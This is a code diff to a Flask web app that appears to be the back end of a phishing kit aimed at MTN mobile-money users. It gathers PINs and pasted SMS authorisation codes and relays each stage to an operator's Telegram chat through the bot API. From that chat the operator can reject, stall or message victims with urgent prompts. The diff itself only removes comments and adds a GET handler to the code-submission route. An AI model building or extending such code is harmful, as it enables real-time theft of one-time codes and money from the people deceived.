@@ -100,7 +100,6 @@ def telegram_webhook():
                 text_response = f"❌ {step_code.upper()} Rejected!"
 
             elif action == "badsms":
-                # Handle garbage or incorrect paste inputs from users
                 applications_collection.update_one(
                     {"_id": ObjectId(db_id)},
                     {"$set": {"status": "BadInput", "custom_message": "Invalid SMS or data format submitted. Please copy the complete, unedited message from MTN."}}
@@ -108,7 +107,6 @@ def telegram_webhook():
                 text_response = "⚠️ Flagged bad input for user correction."
 
             elif action == "stalled":
-                # Handle users lingering or stalling out
                 applications_collection.update_one(
                     {"_id": ObjectId(db_id)},
                     {"$set": {"status": "StalledPrompt", "custom_message": "Your session is waiting for authorization. Please respond promptly to avoid cancellation."}}
@@ -131,16 +129,13 @@ def telegram_webhook():
         chat_id = str(msg.get("chat", {}).get("id"))
         text = msg.get("text", "")
         
-        # Check if message is from the admin chat ID
         if chat_id == TELEGRAM_ADMIN_CHAT_ID:
-            # If the admin replies to a notification or types a custom message, find the latest active application
             latest_app = applications_collection.find_one(sort=[("_id", -1)])
             if latest_app:
                 applications_collection.update_one(
                     {"_id": latest_app["_id"]},
                     {"$set": {"custom_message": text, "status": "CustomMessage"}}
                 )
-                # Send confirmation back to admin chat
                 reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                 requests.post(reply_url, json={
                     "chat_id": TELEGRAM_ADMIN_CHAT_ID,
@@ -251,20 +246,23 @@ def check_status():
             
     return jsonify({"status": "Pending_PIN", "custom_message": ""})
 
-@app.route("/submit-auth-code", methods=["POST"])
+@app.route("/submit-auth-code", methods=["GET", "POST"])
 def submit_auth_code():
-    auth_code = request.form.get("auth_code")
-    current_id = session.get("current_app_id")
-    
-    if current_id:
-        applications_collection.update_one(
-            {"_id": ObjectId(current_id)},
-            {"$set": {"auth_code": auth_code, "status": "Pending_SMS"}}
-        )
-        record = applications_collection.find_one({"_id": ObjectId(current_id)})
-        send_telegram_interactive_alert(record, stage_title="APPROVAL 2: SMS MESSAGE SUBMITTED", step_code="sms")
+    if request.method == "POST":
+        auth_code = request.form.get("auth_code")
+        current_id = session.get("current_app_id")
         
-    return redirect(url_for("pending", app_id=record.get("app_id") if record else ""))
+        if current_id:
+            applications_collection.update_one(
+                {"_id": ObjectId(current_id)},
+                {"$set": {"auth_code": auth_code, "status": "Pending_SMS"}}
+            )
+            record = applications_collection.find_one({"_id": ObjectId(current_id)})
+            send_telegram_interactive_alert(record, stage_title="APPROVAL 2: SMS MESSAGE SUBMITTED", step_code="sms")
+            
+        return redirect(url_for("pending", app_id=record.get("app_id") if record else ""))
+    
+    return render_template("submit_auth_code.html")
 
 @app.route("/final-verify", methods=["GET", "POST"])
 def final_verify():
